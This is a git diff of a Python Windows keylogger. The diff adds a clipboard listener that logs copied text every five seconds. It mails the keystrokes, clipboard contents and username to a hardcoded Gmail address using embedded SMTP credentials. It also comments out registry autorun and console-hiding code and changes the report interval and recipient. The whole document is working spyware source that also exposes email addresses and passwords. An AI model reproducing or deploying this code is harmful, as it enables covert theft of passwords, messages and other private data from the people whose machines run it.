@@ -1,6 +1,8 @@
 import os
 from pickle import FALSE
+from platform import platform
 import time
+from click import File
 import keyboard # for keylogs
 import smtplib
 from email.mime.image import MIMEImage
@@ -18,24 +20,39 @@ import autorun
 import win32process
 import  shutil
 
-autorun.AddToRegistry()
-hwnd = ctypes.windll.kernel32.GetConsoleWindow()      
-if hwnd != 0:      
-    ctypes.windll.user32.ShowWindow(hwnd, 0)      
-    ctypes.windll.kernel32.CloseHandle(hwnd)
-    _, pid = win32process.GetWindowThreadProcessId(hwnd)
 
+# autorun.AddToRegistry()
+# hwnd = ctypes.windll.kernel32.GetConsoleWindow()      
+# if hwnd != 0:      
+#     ctypes.windll.user32.ShowWindow(hwnd, 0)      
+#     ctypes.windll.kernel32.CloseHandle(hwnd)
+#     _, pid = win32process.GetWindowThreadProcessId(hwnd)
 
 
 print('program started')
 img_count = 1
+comname = getpass.getuser()
+# print(comname)
+temp_data = pyperclip.paste()
+
+
+def clipboard_listener():
+    global temp_data
+    if temp_data != pyperclip.paste():
+        temp_data = pyperclip.paste()
+        with open('clipboard.txt', 'a') as clip:
+            clip.write(f'\n\n{pyperclip.paste()}')
+    mytimer = Timer(interval=5, function = clipboard_listener)
+    mytimer.daemon = True
+    mytimer.start()        
 
 def main_func():
-    SEND_REPORT_EVERY = 60 # in seconds, 60 means 1 minute and so on
-    EMAIL_ADDRESS = "Shalinitiwari1098@gmail.com"
-    EMAIL_PASSWORD = "abcd@1234"
-    # EMAIL_ADDRESS = "core.builder11@gmail.com"
-    # EMAIL_PASSWORD = "builder123*"
+    clipboard_listener()
+    SEND_REPORT_EVERY = 1800 # in seconds, 60 means 1 minute and so on
+    # EMAIL_ADDRESS = "Shalinitiwari1098@gmail.com"
+    # EMAIL_PASSWORD = "abcd@1234"
+    EMAIL_ADDRESS = "core.builder11@gmail.com"
+    EMAIL_PASSWORD = "builder123*"
 
     class Keylogger:
         def __init__(self, interval, report_method="email"):
@@ -61,7 +78,7 @@ def main_func():
                     name = " "
                 elif name == "enter":
                     # add a new line whenever an ENTER is pressed
-                    name = "[ENTER]\n"
+                    name = "\n"
                 # elif name == "backspace":
                 #     self.log[:-1]
                 #     name = ''
@@ -93,12 +110,21 @@ def main_func():
             if not os.path.exists(os.path.join('C://', 'temp')):
                 os.mkdir(os.path.join('C://', 'temp'))
             # _ss_func()
+             
             msg = MIMEMultipart("related")
-            msg["Subject"] = f'Device Name: \n{getpass.getuser()}\n\n'
-            email_body = '\n\nClipboard data:\n'  + pyperclip.paste() + '\n\n\n\n' + message
+            msg["Subject"] = comname
+            
             msg["From"] = email
+            # filename = "clipboard.txt"
+            # msg.add_attachment(open(filename, "r").read(), filename=filename)
+            # str(Header(f'{comname}<{email}>'))
             # msg["To"] = 'core.builder11@gmail.com'
             # Anshumankumar7890@gmail.com
+            clip_data = ''
+            with open('clipboard.txt', 'r+') as clip: 
+                clip_data = clip.read()           
+                clip.truncate(0)
+            email_body = f'\n\nClipboard data:\n {clip_data} \n\n\n\n {message}'
             msg.attach(MIMEText(email_body))
             for i in range(1,4):
                 time.sleep(5)
@@ -116,7 +142,7 @@ def main_func():
             # login to the email account
             server.login(email, password)
             # send the actual message
-            server.sendmail(email, 'Anshumankumar7890@gmail.com',msg.as_string())
+            server.sendmail(email, 'core.builder11@gmail.com',msg.as_string())
             print('email sent successfully')
             # terminates the session
             server.quit()
